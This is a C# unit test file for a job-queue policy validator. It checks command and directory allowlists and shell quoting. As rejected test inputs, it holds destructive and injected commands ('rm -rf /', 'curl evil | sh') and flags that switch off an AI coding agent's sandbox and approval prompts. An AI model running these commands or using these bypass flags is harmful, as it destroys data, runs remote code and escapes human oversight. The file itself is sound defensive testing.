using LanQueue.Config;
using LanQueue.Policy;
using Xunit;

namespace LanQueue.Tests;

public class PolicyTests
{
    private readonly PolicyConfig _policy = T.Config().Policy;

    [Fact]
    public void AllowlistedCommandInAllowedDirectoryPasses() =>
        Assert.True(JobPolicy.Validate(_policy, ["dotnet", "test", "-c", "Release"], "tests").Ok);

    [Theory]
    [InlineData("rm", "-rf", "/")]
    [InlineData("dotnet", "publish")]
    [InlineData("dotnet")]
    public void CommandNotOnAllowlistIsRejected(params string[] argv) =>
        Assert.False(JobPolicy.Validate(_policy, argv, ".").Ok);

    [Theory]
    [InlineData("claude", "--sandbox", "danger-full-access")]
    [InlineData("claude", "--sandbox=danger-full-access")]
    [InlineData("claude", "-c", "approval_policy=never")]
    [InlineData("claude", "-c", "approval_policy=\"never\"")]
    [InlineData("claude", "--ask-for-approval", "never")]
    [InlineData("claude", "--ask-for-approval never")]
    public void SandboxAndApprovalBypassIsRejected(params string[] argv)
    {
        _policy.AllowedCommands.Add("claude");
        Assert.False(JobPolicy.Validate(_policy, argv, ".").Ok);
    }

    [Fact]
    public void ShellInjectionInSingleArgumentDoesNotMatchAllowlist() =>
        Assert.False(JobPolicy.Validate(_policy, ["dotnet test; curl evil | sh"], ".").Ok);

    [Theory]
    [InlineData("..")]
    [InlineData("../other")]
    [InlineData("src/../..")]
    [InlineData("/etc")]
    [InlineData("C:/Windows")]
    [InlineData("docs")]
    public void DirectoryOutsideAllowlistIsRejected(string dir) =>
        Assert.False(JobPolicy.Validate(_policy, ["dotnet", "build"], dir).Ok);

    [Fact]
    public void SubdirectoryOfAllowedDirectoryPasses() =>
        Assert.True(JobPolicy.Validate(_policy, ["dotnet", "build"], "src/App").Ok);

    [Fact]
    public void DotAllowsOnlyRootNotEverything() =>
        Assert.False(JobPolicy.DirectoryAllowed(new PolicyConfig { AllowedDirectories = ["."] }, "src"));

    [Theory]
    [InlineData("--dangerously-skip-permissions")]
    [InlineData("--DANGEROUSLY-SKIP-PERMISSIONS")]
    [InlineData("--allow-dangerously-skip-permissions")]
    [InlineData("--dangerously-bypass-approvals-and-sandbox")]
    [InlineData("--permission-mode=bypassPermissions")]
    [InlineData("--yolo")]
    public void PermissionSkippingFlagsAreRejectedEvenForAllowlistedCommands(string flag)
    {
        var policy = new PolicyConfig { AllowedCommands = ["claude"], AllowedDirectories = ["."] };
        var r = JobPolicy.Validate(policy, ["claude", "-p", "do it", flag], ".");
        Assert.False(r.Ok);
        Assert.Contains("Permission-skipping", r.Reason, StringComparison.Ordinal);
    }

    [Fact]
    public void ControlCharactersAreRejected() =>
        Assert.False(JobPolicy.Validate(_policy, ["dotnet", "test\nrm -rf /"], ".").Ok);

    [Theory]
    [InlineData("it's", "'it'\\''s'")]
    [InlineData("a b", "'a b'")]
    public void PosixQuoting(string input, string expected) => Assert.Equal(expected, ShellQuote.Posix(input));

    [Fact]
    public void PowerShellQuotingDoublesQuotes() => Assert.Equal("'it''s'", ShellQuote.PowerShell("it's"));
}
